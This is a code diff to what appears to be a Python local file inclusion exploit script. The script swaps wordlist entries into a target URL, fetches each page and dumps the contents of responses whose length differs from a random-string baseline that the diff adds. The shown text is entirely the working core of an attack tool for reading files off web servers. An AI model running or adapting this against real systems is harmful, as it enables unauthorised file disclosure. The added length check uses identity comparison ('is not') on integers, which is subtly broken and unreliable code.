@@ -16,13 +16,19 @@ def vrfy_args():
         sys.exit()
 
 def exploit_LFI():
+    random = "VQ328FEBWUBFI32BUI3BBF"
+    URL = args.url.replace('LFI', random)
+    page = urlopen(URL)
+    content = page.read()
+    default_size = len(content)
+
     url = args.url
     f = open(args.list)
     for line in f.readlines():
         url_var = url.replace('LFI', line)
         page = urlopen(url_var)
         content = page.read()
-        if len(content) > 0:
+        if len(content) is not default_size:
             if args.dest == None:
                 print("Result for => " + line + "\n" + content.decode("utf-8") + "\n")
             else:
